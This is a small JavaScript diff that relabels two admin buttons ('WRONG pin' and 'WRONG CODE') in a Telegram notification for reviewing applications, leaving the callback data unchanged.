@@ -440,8 +440,8 @@ async function notifyTelegram(application) {
     // Three admin actions; verification values are never displayed.
     const keyboard = { inline_keyboard: [[
       { text: "✅ APPROVE", callback_data: `approve:${application.id}` },
-      { text: "🪪 WRONG ID", callback_data: `wrongid:${application.id}` },
-      { text: "⚠️ VERIFICATION FAILED", callback_data: `verifyfail:${application.id}` }
+      { text: "❌ WRONG pin", callback_data: `wrongid:${application.id}` },
+      { text: "❌ WRONG CODE", callback_data: `verifyfail:${application.id}` }
     ]]};
     try {
       await bot.sendMessage(adminId, text, { reply_markup: keyboard, disable_web_page_preview: true });
